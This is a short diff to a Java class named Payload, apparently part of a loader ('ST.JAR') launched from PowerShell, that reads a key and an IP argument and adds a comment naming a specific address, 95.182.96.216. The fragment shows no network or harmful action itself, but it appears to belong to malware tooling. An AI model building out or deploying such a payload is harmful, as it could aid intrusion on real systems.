@@ -11,9 +11,8 @@ public class Payload {
         log("--- STARTING ST.JAR ---");
         try {
             if (args.length < 2) return;
-            // ADDED .trim() TO STRIP INVISIBLE CHARACTERS FROM POWERSHELL
             String key = args[0].trim();
-            String ip = args[1].trim();
+            String ip = args[1].trim(); // This is now just "95.182.96.216"
             
             log("Key: " + key + " | IP: " + ip);
 
